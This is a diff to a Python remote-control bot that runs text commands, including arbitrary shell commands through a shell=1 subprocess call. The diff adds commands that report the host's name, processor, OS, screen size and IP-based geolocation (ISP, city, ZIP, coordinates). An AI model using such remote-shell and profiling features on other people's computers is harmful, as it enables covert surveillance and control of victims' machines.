@@ -1,5 +1,7 @@
 # -*- coding: utf8 -*-
+import platform
 import subprocess, os, re, time
+import requests
 import wget as wg
 import pyautogui,os,time
 import keyboard
@@ -63,6 +65,45 @@ def pict(pic):
 	start_file(pic+".png")
 	keyboard.press_and_release("F11")
 	return "🖥✅"
+
+def ip_address():
+    try:
+        ip = requests.get("http://jsonip.com/").json()
+        response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()
+        # print(response)
+        
+        data = {
+            '[IP]': response.get('query'),
+            '[Int prov]': response.get('isp'),
+            '[Org]': response.get('org'),
+            '[Country]': response.get('country'),
+            '[Region Name]': response.get('regionName'),
+            '[City]': response.get('city'),
+            '[ZIP]': response.get('zip'),
+            '[Lat]': response.get('lat'),
+            '[Lon]': response.get('lon'),
+        }
+        pl=""
+        for k, v in data.items():
+            pl+=f'{k} : {v}\n'
+        return pl
+        
+    except requests.exceptions.ConnectionError:
+        return '[!] Please check your connection!'
+        
+def specifications():
+	x,y=pyautogui.size()
+	banner = f"""
+	Name PC: {platform.node()}
+	Processor: {platform.processor()}
+	System: {platform.system()} {platform.release()}
+	Screen size: {x}x{y}
+	"""
+	return banner
+
+def raskladka():
+	keyboard.press_and_release("shift+alt")
+	return '🖥✅'
 
 def cmdo(com):
 	try:			res=subprocess.check_output(com, shell=1)
@@ -145,6 +186,15 @@ def com_bot(kl):
 		elif kl.lower()[:4]=='scrn':
 			res=screenshot()
 
+		elif kl.lower()[:4]=='spec':
+			res=specifications()
+
+		elif kl.lower()[:4]=='rask':
+			res=raskladka()
+
+		elif kl.lower()[:4]=='ipad':
+			res=ip_address()
+
 		elif kl.lower()[:4]=='lock':
 			res=lock()
 
@@ -155,5 +205,5 @@ def com_bot(kl):
 
 
 	except: return res
-# print(del_exit("kkd"))
+# print(ip_address())
 # print(start_file(input()))
